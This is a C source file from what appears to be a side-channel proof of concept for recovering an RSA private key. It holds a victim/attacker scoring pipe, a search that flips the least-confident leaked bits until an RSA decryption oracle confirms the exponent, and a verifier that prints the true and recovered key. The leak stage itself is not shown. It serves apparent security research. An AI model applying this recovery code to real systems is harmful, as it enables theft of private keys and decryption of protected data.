#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "poc.h"
#include "donor.h"
#include "scoring.h"

uint64_t g_key_limbaddr = 0;
int g_key_limbs = 0;
unsigned long *g_key_truth = NULL;
OBIGNUM *g_d = NULL, *g_n = NULL, *g_e = NULL;
BN_CTX *g_ctx = NULL;

struct keywire {
    uint64_t limbaddr;
    int32_t limbs;
    int32_t nlen;
    int32_t elen;
    int32_t _pad;
};

static int full_write(int fd, const void *buf, size_t remaining) {
    const uint8_t *cursor = buf;
    while (remaining) {
        ssize_t written = write(fd, cursor, remaining);
        if (written <= 0) {
            return -1;
        }
        cursor += written;
        remaining -= (size_t)written;
    }
    return 0;
}

static int full_read(int fd, void *buf, size_t remaining) {
    uint8_t *cursor = buf;
    while (remaining) {
        ssize_t got = read(fd, cursor, remaining);
        if (got <= 0) {
            return -1;
        }
        cursor += got;
        remaining -= (size_t)got;
    }
    return 0;
}

void send_key_to_parent(int fd) {
    struct bignum_st *bn_d = (struct bignum_st *)g_d;
    int nlen = (p_BN_num_bits(g_n) + 7) / 8;
    int elen = (p_BN_num_bits(g_e) + 7) / 8;
    unsigned char *n_bytes = malloc((size_t)nlen);
    unsigned char *e_bytes = malloc((size_t)elen);
    p_BN_bn2bin(g_n, n_bytes);
    p_BN_bn2bin(g_e, e_bytes);
    struct keywire hdr = { .limbaddr = g_key_limbaddr, .limbs = g_key_limbs, .nlen = nlen, .elen = elen, ._pad = 0 };
    if (full_write(fd, &hdr, sizeof hdr)
     || full_write(fd, bn_d->d, (size_t)g_key_limbs * 8)
     || full_write(fd, n_bytes, (size_t)nlen) || full_write(fd, e_bytes, (size_t)elen)) {
        printf("[victim] !! failed to send key over scoring pipe\n");
        _exit(1);
    }
    free(n_bytes);
    free(e_bytes);
}

void recv_key_from_parent(int fd) {
    struct keywire hdr = { 0 };
    if (full_read(fd, &hdr, sizeof hdr)) {
        printf("!! scoring pipe: no key header (victim keygen failed?)\n");
        _exit(1);
    }
    g_key_limbaddr = hdr.limbaddr;
    g_key_limbs = hdr.limbs;
    if (g_key_limbs <= 0 || g_key_limbs > 1024 || hdr.nlen <= 0 || hdr.elen <= 0) {
        printf("!! scoring pipe: bad header\n");
        _exit(1);
    }
    g_key_truth = malloc((size_t)g_key_limbs * 8);
    unsigned char *n_bytes = malloc((size_t)hdr.nlen);
    unsigned char *e_bytes = malloc((size_t)hdr.elen);
    if (full_read(fd, g_key_truth, (size_t)g_key_limbs * 8)
     || full_read(fd, n_bytes, (size_t)hdr.nlen) || full_read(fd, e_bytes, (size_t)hdr.elen)) {
        printf("!! scoring pipe: truncated key material\n");
        _exit(1);
    }
    g_n = p_BN_bin2bn(n_bytes, hdr.nlen, NULL);
    g_e = p_BN_bin2bn(e_bytes, hdr.elen, NULL);
    g_ctx = p_BN_CTX_new();
    free(n_bytes);
    free(e_bytes);
    printf("[attacker] scoring pipe: victim's d = %d limbs @ %#lx (truth for scoring ONLY)\n",
           g_key_limbs, g_key_limbaddr);
}

static OBIGNUM *limbs_to_bn(const unsigned long *limbs, int num_limbs, OBIGNUM *reuse) {
    int nbytes = num_limbs * 8;
    unsigned char *big_endian = malloc(nbytes);
    for (int limb_index = 0; limb_index < num_limbs; ++limb_index) {
        for (int byte_index = 0; byte_index < 8; ++byte_index) {
            big_endian[(num_limbs - 1 - limb_index) * 8 + (7 - byte_index)] = (unsigned char)((limbs[limb_index] >> (8 * byte_index)) & 0xff);
        }
    }
    OBIGNUM *bn = p_BN_bin2bn(big_endian, nbytes, reuse);
    free(big_endian);
    return bn;
}

// RSA inversion oracle: d decrypts iff m == (m^e)^d mod n. The ciphertexts depend only on public (e, n).
static const unsigned long oracle_probes[3] = { 0x2A2A2A2AUL, 0xCAFEBABEUL, 0x0123456789ABCDEFUL };
static OBIGNUM *oracle_msg[3] = { 0 };
static OBIGNUM *oracle_cph[3] = { 0 };
static OBIGNUM *oracle_dec = NULL;

static void oracle_init(void) {
    if (oracle_dec) {
        return;
    }
    for (int i = 0; i < 3; ++i) {
        oracle_msg[i] = p_BN_new();
        oracle_cph[i] = p_BN_new();
        p_BN_set_word(oracle_msg[i], oracle_probes[i]);
        p_BN_mod_exp(oracle_cph[i], oracle_msg[i], g_e, g_n, g_ctx);
    }
    oracle_dec = p_BN_new();
}

static int exponent_decrypts(const OBIGNUM *drec) {
    oracle_init();
    for (int i = 0; i < 3; ++i) {
        if (p_BN_mod_exp(oracle_dec, oracle_cph[i], drec, g_n, g_ctx) != 1) {
            return 0;
        }
        if (p_BN_cmp(oracle_msg[i], oracle_dec) != 0) {
            return 0;
        }
    }
    return 1;
}

#define CORR_CAND 48   // least-confident bit positions the corrector searches

static unsigned long *cand_limbs = NULL;
static int cand_num_limbs = 0;
static OBIGNUM *cand_exponent = NULL;
static const double *cand_confidence = NULL;

static int least_confident_first(const void *a, const void *b) {
    double ca = cand_confidence[*(const int *)a];
    double cb = cand_confidence[*(const int *)b];
    return (ca > cb) - (ca < cb);
}

static int candidate_decrypts(void) {
    cand_exponent = limbs_to_bn(cand_limbs, cand_num_limbs, cand_exponent);
    return exponent_decrypts(cand_exponent);
}

// A winning subset stays flipped, a failed one is reverted.
static int search_subsets(const int *bits, int nbits, int k, int start, int depth) {
    if (depth == k) {
        return candidate_decrypts();
    }
    for (int i = start; i <= nbits - (k - depth); ++i) {
        int gi = bits[i];
        cand_limbs[gi >> 6] ^= (1UL << (gi & 63));
        if (search_subsets(bits, nbits, k, i + 1, depth + 1)) {
            return 1;
        }
        cand_limbs[gi >> 6] ^= (1UL << (gi & 63));
    }
    return 0;
}

// Flip up to max_errors of the least-confident bits until the exponent decrypts. Returns the number
// corrected, or -1 if no subset within the search recovers d.
int correct_key(unsigned long *limbs, int num_limbs, const double *bit_conf, int max_errors) {
    cand_limbs = limbs;
    cand_num_limbs = num_limbs;
    if (candidate_decrypts()) {
        return 0;
    }
    int nbits = num_limbs * 64;
    int *order = malloc((size_t)nbits * sizeof(int));
    for (int i = 0; i < nbits; ++i) {
        order[i] = i;
    }
    cand_confidence = bit_conf;
    qsort(order, (size_t)nbits, sizeof(int), least_confident_first);
    int ncand = nbits < CORR_CAND ? nbits : CORR_CAND;
    int found = -1;
    for (int k = 1; k <= max_errors && found < 0; ++k) {
        if (search_subsets(order, ncand, k, 0, 0)) {
            found = k;
        }
    }
    free(order);
    return found;
}

void verify_key(const unsigned long *recovered_limbs, int num_limbs) {
    OBIGNUM *drec = limbs_to_bn(recovered_limbs, num_limbs, NULL);
    OBIGNUM *dtrue = limbs_to_bn(g_key_truth, num_limbs, NULL);
    char *hx_true = p_BN_bn2hex(dtrue);
    char *hx_rec = p_BN_bn2hex(drec);
    int hexmatch = (strcmp(hx_true, hx_rec) == 0);

    OBIGNUM *message = p_BN_new();
    OBIGNUM *cipher = p_BN_new();
    OBIGNUM *decrypted = p_BN_new();
    p_BN_set_word(message, 0x2A2A2A2AUL);
    int inv_ok = 0;
    if (p_BN_mod_exp(cipher, message, g_e, g_n, g_ctx) == 1 && p_BN_mod_exp(decrypted, cipher, drec, g_n, g_ctx) == 1) {
        inv_ok = (p_BN_cmp(message, decrypted) == 0);   // m == (m^e)^d mod n  iff  drec is the real private exponent
    }
    tee_printf("\n==== PRIVATE-KEY RECOVERY ====\n");
    tee_printf("  true d : %.64s%s\n", hx_true, strlen(hx_true) > 64 ? "..." : "");
    tee_printf("  leaked : %.64s%s\n", hx_rec, strlen(hx_rec) > 64 ? "..." : "");
    tee_printf("  exponent hex exact-match : %s\n", hexmatch ? "YES (full 2048-bit d recovered byte-exact)" : "no (see per-limb acc)");
    tee_printf("  RSA inversion m==(m^e)^d mod n : %s\n", inv_ok ? "YES, recovered exponent DECRYPTS -> genuine private key" : "no");
}
